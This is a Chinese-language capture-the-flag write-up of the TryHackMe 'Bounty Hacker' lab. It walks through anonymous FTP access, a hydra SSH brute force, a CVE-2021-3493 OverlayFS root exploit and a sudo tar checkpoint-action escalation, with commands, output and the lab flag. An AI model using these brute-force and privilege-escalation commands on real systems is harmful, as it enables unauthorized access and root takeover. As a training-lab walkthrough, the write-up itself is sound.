# Bounty Hacker

你在酒吧里不停地吹嘘你的精英黑客技能，一些赏金猎人决定接受你的索赔！证明你的身份不仅仅是在酒吧喝几杯。我感觉到你的未来有甜椒和牛肉！

---

循例，nmap扫一波

开了21，22，80

先用anonymous尝试登录ftp

成功，里面有两个文件,但是get不下来，重启靶机之后也不行，然后怀疑是被动模式被安全设备拦截的问题，输入命令：

    passive

切换到主动模式，让服务器主动与我们进行数据连接，类似reverse shell的原理

get里面的两个文本文件，task.txt披露了用户名，locks.txt是一个长得像密码本的文件

尝试爆破ssh:

    hydra -l lin -P ./locks.txt 10.10.239.214 ssh

<pre>[<font color="#47D4B9"><b>22</b></font>][<font color="#47D4B9"><b>ssh</b></font>] host: <font color="#47D4B9"><b>10.10.239.214</b></font>   login: <font color="#47D4B9"><b>lin</b></font>   password: <font color="#47D4B9"><b>RedDr4gonSynd1cat3</b></font></pre>

登录进去后，老规矩一波收集信息

    cat /proc/version

<pre><font color="#47D4B9"><b>lin@bountyhacker</b></font>:<font color="#277FFF"><b>~/Desktop</b></font>$ cat /proc/version
Linux version 4.15.0-101-generic (buildd@lgw01-amd64-052) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)) #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020
</pre>

### 稍微非预期

可以看到ubuntu的版本是16.04

CVE-2021-3493

这个漏洞关于是overlayFS的：https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/

这个漏洞在tyrhackme上也有复现room，当然我也是在那个room学到的。

这个漏洞适用于 

    ubuntu 14.04 lts
    ubuntu 16.04 lts
    ubuntu 18.04 lts
    ubuntu 20.04 lts
    ubuntu 20.10

所以直接将exploit传进去

    gcc -o ./getroot ./CVE-2021-3493_exp.c

运行./getroot

<pre><font color="#47D4B9"><b>lin@bountyhacker</b></font>:<font color="#277FFF"><b>~/Desktop</b></font>$ gcc -o getroot ./shell.c
<font color="#47D4B9"><b>lin@bountyhacker</b></font>:<font color="#277FFF"><b>~/Desktop</b></font>$ ./getroot 
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt
THM{80UN7Y_h4cK3r}
</pre>

哈哈，我也是第一次成功利用该漏洞，继thm的那个复现room后。


### 预期解法:

sudo -l查看：

    User lin may run the following commands on bountyhacker:
        (root) /bin/tar

翻一下[垃圾桶](https://gtfobins.github.io/gtfobins/tar/)

tar可以被利用，构造：

    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

<pre><font color="#47D4B9"><b>lin@bountyhacker</b></font>:<font color="#277FFF"><b>~/Desktop</b></font>$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/&apos; from member names
<font color="#47D4B9"><b>root@bountyhacker</b></font>:<font color="#277FFF"><b>~/Desktop</b></font># whoami
root
</pre>
